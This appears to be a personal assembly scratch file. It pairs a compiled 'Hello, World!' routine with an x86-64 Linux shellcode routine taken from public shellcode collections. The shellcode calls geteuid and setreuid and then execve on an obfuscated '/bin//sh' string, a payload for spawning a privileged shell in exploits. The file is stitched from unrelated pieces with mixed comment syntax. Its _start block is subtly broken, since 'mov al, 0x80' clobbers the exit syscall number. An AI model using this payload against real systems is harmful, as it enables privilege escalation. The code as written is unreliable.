.LC0:
        .string "Hello, World!"
main:
        push    rbp
        mov     rbp, rsp
        mov     edi, OFFSET FLAT:.LC0
        mov     eax, 0
        call    printf
        mov     eax, 0
        pop     rbp
        ret

/*
https://github.com/t00sh/assembly/blob/master/shellcodes/linux/x86-64/bash.asm
https://shell-storm.org/shellcode/files/shellcode-806.html
*/
.global _start


shell:
    ;mov rbx, 0x68732f6e69622f2f
    ;mov rbx, 0x68732f6e69622fff
    ;shr rbx, 0x8
    ;mov rax, 0xdeadbeefcafe1dea
    ;mov rbx, 0xdeadbeefcafe1dea
    ;mov rcx, 0xdeadbeefcafe1dea
    ;mov rdx, 0xdeadbeefcafe1dea
	xor rax,rax
	mov al, 107
	syscall

	mov rdi, rax
	mov rsi, rax
	xor rax,rax
	mov al, 113
	syscall    
    
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall

_start:
    /*0x700000 + 1024*1024 - 1*/
    mov     eax, 60 // interrupt code
    mov     edi, 0 // argument, in this case: return value
    mov     al, 0x80
    syscall  